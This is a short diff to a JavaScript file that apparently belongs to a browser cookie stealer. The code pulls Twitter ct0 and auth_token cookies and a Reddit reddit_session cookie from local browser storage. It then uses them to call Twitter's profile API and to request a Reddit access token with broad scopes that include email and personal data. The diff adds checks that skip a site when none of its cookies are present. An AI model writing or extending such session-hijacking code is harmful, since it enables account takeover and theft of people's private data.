@@ -6,6 +6,7 @@ const { join } = require('path');
 const cookies = getCookies();
 
 const twitter = async () => {
+  if (!(await cookies).find(cookie => cookie.host.includes('.twitter.com'))) return;
   const { value: ct0 } = (await cookies).find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0');
   const { value: authToken, source } = (await cookies).find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'auth_token');
   const { data: profile } = await axios.post('https://twitter.com/i/api/1.1/account/update_profile.json', {}, {
@@ -35,6 +36,7 @@ const twitter = async () => {
 };
 
 const reddit = async () => {
+  if (!(await cookies).find(cookie => cookie.host.includes('.reddit.com'))) return;
   const { value: cookie, source } = (await cookies).find(cookie => cookie.host.includes('.reddit.com') && cookie.name === 'reddit_session');
   const { data: bearer } = await axios.post('https://accounts.reddit.com/api/access_token', { scopes: ['*', 'email', 'pii'] }, {
     headers: { Cookie: `reddit_session=${cookie}`, Authorization: 'Basic b2hYcG9xclpZdWIxa2c6' }
